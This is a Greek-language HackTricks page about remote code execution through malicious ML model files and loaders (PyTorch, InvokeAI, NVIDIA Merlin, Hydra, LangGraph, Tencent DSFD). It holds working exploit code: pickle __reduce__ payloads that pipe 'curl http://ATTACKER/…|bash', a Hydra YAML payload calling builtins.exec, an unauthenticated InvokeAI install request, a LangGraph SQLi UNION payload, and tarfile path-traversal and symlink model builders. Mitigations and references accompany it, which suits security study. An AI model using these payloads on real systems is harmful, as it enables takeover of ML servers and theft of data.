# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Τα Machine Learning models συνήθως διαμοιράζονται σε διαφορετικά formats, όπως ONNX, TensorFlow, PyTorch κ.λπ. Αυτά τα models μπορούν να φορτωθούν στα machines των developers ή σε production systems για να χρησιμοποιηθούν. Κανονικά, τα models δεν θα έπρεπε να περιέχουν malicious code, αλλά υπάρχουν περιπτώσεις όπου το model μπορεί να χρησιμοποιηθεί για την εκτέλεση arbitrary code στο system ως προβλεπόμενο feature ή λόγω vulnerability στη model loading library.

Κατά τη στιγμή της συγγραφής, αυτά είναι ορισμένα παραδείγματα αυτού του τύπου vulnerabilities:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle στο model checkpoint οδηγεί σε code execution (παρακάμπτοντας το `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download προκαλεί code execution· Java deserialization RCE στο management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization μέσω `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint ενεργοποιεί τον pickle reducer κατά το `load_model_trainer_states_from_checkpoint` → code execution στον ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Το user-controlled `filter` key εισάγει σύνταξη SQL/JSON-path, το `UNION SELECT` κατασκευάζει ένα fake checkpoint row και, στη συνέχεια, το `msgpack` deserialization κάνει import και καλεί Python code που επιλέγει ο attacker | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Το loading model από YAML χρησιμοποιεί `yaml.unsafe_load` (code exec) <br> Το loading model με **Lambda** layer εκτελεί arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model ενεργοποιεί integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Το loading ενός model μέσω `joblib.load` εκτελεί pickle με το `__reduce__` payload του attacker                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | Το default του `numpy.load` επέτρεπε pickled object arrays – malicious `.npy/.npz` προκαλεί code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Το external-weights path του ONNX model μπορεί να διαφύγει από το directory (read arbitrary files) <br> Malicious ONNX model tar μπορεί να overwrite arbitrary files (οδηγώντας σε RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model με custom operator απαιτεί loading native code του attacker· complex model graphs κάνουν abuse της λογικής για την εκτέλεση unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Η χρήση του model-load API με ενεργοποιημένο το `--model-control` επιτρέπει relative path traversal για την εγγραφή files (π.χ. overwrite του `.bashrc` για RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file προκαλεί heap buffer overflows στον parser, επιτρέποντας arbitrary code execution στο victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model με Lambda layer εξακολουθεί να εκτελεί code κατά το load (το Keras safe_mode δεν καλύπτει το old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Πολλά ML tools (π.χ. pickle-based model formats, Python `pickle.load`) θα εκτελέσουν arbitrary code που είναι embedded σε model files, εκτός αν ληφθούν mitigations | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata που περνά στο `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Το attacker-controlled model metadata/config ορίζει το `_target_` σε arbitrary callable (π.χ. `builtins.exec`) → εκτελείται κατά το load, ακόμη και με “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Επιπλέον, υπάρχουν ορισμένα python pickle-based models, όπως αυτά που χρησιμοποιούνται από το [PyTorch](https://github.com/pytorch/pytorch/security), τα οποία μπορούν να χρησιμοποιηθούν για την εκτέλεση arbitrary code στο system, εάν δεν φορτωθούν με `weights_only=True`. Επομένως, οποιοδήποτε pickle-based model μπορεί να είναι ιδιαίτερα ευάλωτο σε αυτού του τύπου τις attacks, ακόμη και αν δεν περιλαμβάνεται στον παραπάνω πίνακα.

### Hydra metadata → RCE (works even with safetensors)

Το `hydra.utils.instantiate()` κάνει import και καλεί οποιοδήποτε dotted `_target_` σε ένα configuration/metadata object. Όταν οι libraries περνούν **untrusted model metadata** στο `instantiate()`, ένας attacker μπορεί να παρέχει ένα callable και arguments που εκτελούνται άμεσα κατά το model load (χωρίς να απαιτείται pickle).<sup>[[12]](#references)[[13]](#references)</sup>

Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Βασικά σημεία:
- Ενεργοποιείται πριν από την αρχικοποίηση του model στα `restore_from/from_pretrained` του NeMo, στους HuggingFace coders του uni2TS και στους FlexTok loaders.
- Το string block-list του Hydra μπορεί να παρακαμφθεί μέσω alternative import paths (π.χ. `enum.bltns.eval`) ή application-resolved names (π.χ. `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- Το FlexTok αναλύει επίσης stringified metadata με `ast.literal_eval`, επιτρέποντας DoS (υπερβολική κατανάλωση CPU/memory) πριν από την κλήση του Hydra.

### 🆕  InvokeAI RCE μέσω `torch.load` (CVE-2024-12029)

Το `InvokeAI` είναι ένα δημοφιλές open-source web interface για το Stable-Diffusion. Οι εκδόσεις **5.3.1 – 5.4.2** εκθέτουν το REST endpoint `/api/v2/models/install`, το οποίο επιτρέπει στους users να κάνουν download και load models από arbitrary URLs.<sup>[[1]](#references)</sup>

Εσωτερικά, το endpoint τελικά καλεί:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Όταν το παρεχόμενο αρχείο είναι ένα **PyTorch checkpoint (`*.ckpt`)**, το `torch.load` εκτελεί **pickle deserialization**. Επειδή το περιεχόμενο προέρχεται απευθείας από το URL που ελέγχεται από τον χρήστη, ένας attacker μπορεί να ενσωματώσει ένα malicious object με custom μέθοδο `__reduce__` μέσα στο checkpoint· η μέθοδος εκτελείται **κατά τη διάρκεια του deserialization**, οδηγώντας σε **remote code execution (RCE)** στον InvokeAI server.

Στη vulnerability εκχωρήθηκε το **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Δημιουργήστε ένα malicious checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Φιλοξενήστε το `payload.ckpt` σε έναν HTTP server που ελέγχετε (π.χ. `http://ATTACKER/payload.ckpt`).
3. Ενεργοποιήστε το vulnerable endpoint (δεν απαιτείται authentication):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Όταν το InvokeAI κατεβάζει το αρχείο, καλεί το `torch.load()` → το gadget `os.system` εκτελείται και ο attacker αποκτά code execution στο context του process του InvokeAI.

Έτοιμο exploit: το module `exploit/linux/http/invokeai_rce_cve_2024_12029` του **Metasploit** αυτοματοποιεί ολόκληρη τη ροή.<sup>[[3]](#references)</sup>

#### Προϋποθέσεις

•  InvokeAI 5.3.1-5.4.2 (το scan flag είναι από προεπιλογή **false**)
•  Το `/api/v2/models/install` είναι προσβάσιμο από τον attacker
•  Το process έχει permissions για εκτέλεση shell commands

#### Mitigations

* Κάντε upgrade σε **InvokeAI ≥ 5.4.3** – το patch ορίζει `scan=True` από προεπιλογή και εκτελεί malware scanning πριν από το deserialization.<sup>[[2]](#references)</sup>
* Κατά το programmatic loading checkpoints, χρησιμοποιήστε `torch.load(file, weights_only=True)` ή το νέο helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Επιβάλετε allow-lists / signatures για τις model sources και εκτελείτε το service με least-privilege.

> ⚠️ Να θυμάστε ότι οποιοδήποτε format βασισμένο σε Python pickle (συμπεριλαμβανομένων πολλών αρχείων `.pt`, `.pkl`, `.ckpt`, `.pth`) είναι εγγενώς unsafe για deserialization από untrusted sources.

---

Παράδειγμα ad-hoc mitigation, αν πρέπει να διατηρήσετε παλαιότερες εκδόσεις του InvokeAI σε λειτουργία πίσω από reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE μέσω unsafe `torch.load` (CVE-2025-23298)

Το NVIDIA’s Transformers4Rec (μέρος του Merlin) εξέθετε έναν unsafe checkpoint loader που καλούσε απευθείας το `torch.load()` σε paths που παρείχε ο χρήστης. Επειδή το `torch.load` βασίζεται στο Python `pickle`, ένα checkpoint που ελέγχεται από attacker μπορεί να εκτελέσει arbitrary code μέσω ενός reducer κατά το deserialization.<sup>[[5]](#references)</sup>

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Γιατί αυτό οδηγεί σε RCE: Στο Python pickle, ένα object μπορεί να ορίσει έναν reducer (`__reduce__`/`__setstate__`) που επιστρέφει ένα callable και arguments. Το callable εκτελείται κατά το unpickling. Αν ένα τέτοιο object υπάρχει σε ένα checkpoint, εκτελείται πριν χρησιμοποιηθούν οποιαδήποτε weights.

Ελάχιστο malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors και blast radius:
- Trojanized checkpoints/models που διαμοιράζονται μέσω repos, buckets ή artifact registries
- Automated resume/deploy pipelines που φορτώνουν αυτόματα checkpoints
- Η εκτέλεση πραγματοποιείται μέσα σε training/inference workers, συχνά με elevated privileges (π.χ. root σε containers)

Fix: Το commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) αντικατέστησε το άμεσο `torch.load()` με έναν restricted, allow-listed deserializer που υλοποιείται στο `transformers4rec/utils/serialization.py`. Ο νέος loader επικυρώνει types/fields και αποτρέπει την εκτέλεση arbitrary callables κατά το load.<sup>[[7]](#references)</sup>

Defensive guidance ειδικά για PyTorch checkpoints:
- Μην κάνετε unpickle μη αξιόπιστα δεδομένα. Προτιμήστε non-executable formats, όπως [Safetensors](https://huggingface.co/docs/safetensors/index) ή ONNX, όπου είναι δυνατό.
- Αν πρέπει να χρησιμοποιήσετε PyTorch serialization, βεβαιωθείτε ότι το `weights_only=True` είναι ενεργοποιημένο (υποστηρίζεται σε νεότερες εκδόσεις του PyTorch) ή χρησιμοποιήστε custom allow-listed unpickler παρόμοιο με το patch του Transformers4Rec.<sup>[[4]](#references)</sup>
- Επιβάλετε model provenance/signatures και κάντε sandbox το deserialization (seccomp/AppArmor, non-root user, restricted FS και no network egress).
- Παρακολουθείτε για απρόσμενες child processes από ML services κατά το checkpoint load time. Κάντε trace τη χρήση των `torch.load()`/`pickle`.

POC και references για vulnerable/patch:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Παράδειγμα – δημιουργία ενός malicious PyTorch model

- Δημιουργήστε το model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Φόρτωση του μοντέλου:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Το FaceDetection-DSFD της Tencent εκθέτει ένα endpoint `resnet` που κάνει deserialize δεδομένα ελεγχόμενα από τον χρήστη. Το ZDI επιβεβαίωσε ότι ένας remote attacker μπορεί να εξαναγκάσει ένα victim να φορτώσει μια κακόβουλη σελίδα/αρχείο, να το κάνει να στείλει ένα crafted serialized blob σε αυτό το endpoint και να προκαλέσει deserialization ως `root`, οδηγώντας σε πλήρη compromise.

Το exploit flow αντικατοπτρίζει τη συνήθη κατάχρηση του pickle:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Οποιοδήποτε gadget είναι προσβάσιμο κατά το deserialization (constructors, `__setstate__`, callbacks του framework κ.λπ.) μπορεί να weaponized με τον ίδιο τρόπο, ανεξάρτητα από το αν το transport ήταν HTTP, WebSocket ή ένα αρχείο που τοποθετήθηκε σε watched directory.



### LangGraph checkpointer SQLi → MessagePack RCE

Αυτή η attack chain είναι ενδιαφέρουσα επειδή ο attacker **δεν χρειάζεται να ανεβάσει ένα malicious model file**. Αντί γι' αυτό, η εφαρμογή εκθέτει ένα **AI-agent persistence API** (`get_state_history(..., filter=...)`) και το user input φτάνει στον query builder του checkpointer.

#### 1. Structural SQLi σε metadata filters

Ένα ευάλωτο SQLite pattern έμοιαζε ως εξής:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
Η τιμή δεσμεύεται αργότερα, αλλά το `query_key` συνενώνεται στο **JSON path string**, επομένως ένα `'` μέσα στο dictionary key διαφεύγει από το `'$.{query_key}'` και εισάγει SQL. Το ίδιο ισχύει για τα **JSON paths, identifiers, operators, `LIMIT` και TTL fields**: τα placeholders προστατεύουν μόνο τις τιμές, όχι τη δομική σύνταξη του query.

#### 2. Το `UNION SELECT` μπορεί να στοχεύσει downstream sinks, όχι μόνο data theft

Το query επιστρέφει `type` και serialized `checkpoint` bytes, τα οποία στη συνέχεια καταναλώνονται ως:
```python
self.serde.loads_typed((type, checkpoint))
```
Αυτό σημαίνει ότι ένα SQLi στη ρήτρα `WHERE` μπορεί να εισαγάγει μια **πλαστή γραμμή αποτελεσμάτων**:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Αν μεταγενέστερος κώδικας αναλύει, αποσειριοποιεί, γράφει ή εκτελεί οποιαδήποτε επιλεγμένη στήλη, αντιστοιχίστε αυτές τις στήλες στα sinks τους. Σε αυτή την περίπτωση, η πλαστή γραμμή μετατρέπει το SQLi σε **attacker-controlled deserialization**.

#### 3. Τα unsafe MessagePack extension hooks είναι ισοδύναμα με code gadgets

Το path `msgpack` του LangGraph χρησιμοποιούσε ένα custom extension hook που έκανε unpack ένα nested tuple και εκτελούσε:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Έτσι, ένα MessagePack extension object που κωδικοποιεί κάτι ισοδύναμο με το `("os", "system", "id > /tmp/pwned")` κάνει import το `os`, επιλύει το `system` και εκτελεί την εντολή. Κατά την αξιολόγηση AI frameworks, ελέγξτε τους **custom MessagePack/JSON/pickle revivers** για dynamic imports, reflection ή arbitrary callable dispatch.

#### 4. Πρακτικό audit pattern για agent frameworks

Ελέγξτε κάθε user-controlled input που φτάνει σε:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders που δημιουργούν SQL ή Redis query fragments
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths που εμπιστεύονται rows τα οποία επιστρέφονται από το persistence layer

Αυτή η συγκεκριμένη αλυσίδα επηρέαζε self-hosted LangGraph deployments που χρησιμοποιούσαν **SQLite** ή **Redis** checkpointers, όταν untrusted users μπορούσαν να ελέγξουν το `filter`. Οι patched versions που αναφέρονταν στο disclosure ήταν `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` και `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

## Models σε Path Traversal

Όπως αναφέρεται [**σε αυτό το blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), τα περισσότερα model formats που χρησιμοποιούνται από διαφορετικά AI frameworks βασίζονται σε archives, συνήθως `.zip`. Επομένως, μπορεί να είναι δυνατή η κατάχρηση αυτών των formats για την εκτέλεση path traversal attacks, επιτρέποντας την ανάγνωση arbitrary files από το σύστημα όπου φορτώνεται το model.<sup>[[16]](#references)</sup>

Για παράδειγμα, με τον ακόλουθο κώδικα μπορείτε να δημιουργήσετε ένα model που θα δημιουργεί ένα αρχείο στον κατάλογο `/tmp` όταν φορτώνεται:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ή, με τον ακόλουθο κώδικα μπορείτε να δημιουργήσετε ένα μοντέλο που θα δημιουργεί ένα symlink προς τον κατάλογο `/tmp` κατά τη φόρτωσή του:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Εμβάθυνση: Keras .keras deserialization και αναζήτηση gadgets

Για έναν στοχευμένο οδηγό σχετικά με τα εσωτερικά του .keras, το RCE μέσω Lambda-layer, το ζήτημα arbitrary import στις εκδόσεις ≤ 3.8 και την ανακάλυψη gadgets εντός του allowlist μετά το fix, δείτε:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Αναφορές

- [1] [OffSec blog – "CVE-2024-12029 – Deserialization μη αξιόπιστων δεδομένων στο InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit patch του InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Τεκμηρίωση module του Rapid7 Metasploit](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – ζητήματα ασφαλείας για το torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298: Απόκτηση Remote Code Execution στο NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit patch του Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Ευάλωτος loader πριν το patch (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC κακόβουλου checkpoint (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader μετά το patch (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Remote Code Execution με σύγχρονες μορφές και βιβλιοθήκες AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Τεκμηρίωση του Hydra για το instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit block-list του Hydra (προειδοποίηση σχετικά με RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Από SQLi σε RCE: Εκμετάλλευση του Checkpointer του LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Μετατροπή bugs τύπου Archive Slip σε bounties υψηλής αξίας για AI/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)

{{#include ../banners/hacktricks-training.md}}
